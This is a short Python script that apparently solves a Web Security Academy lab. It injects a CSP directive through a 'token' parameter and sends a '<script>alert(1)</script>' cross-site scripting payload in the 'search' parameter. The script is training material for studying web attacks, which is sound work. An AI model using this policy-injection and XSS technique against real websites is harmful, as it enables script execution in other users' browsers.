from web_security_academy.core.logger import logger


def solve_lab(session):
    params = {
        "token": "; script-src-elem 'unsafe-inline'",
        "search": "<script>alert(1)</script>",
    }
    session.get_path("/", params=params)
    logger.info('Visited "/" with the following parameters:')
    logger.info(params)
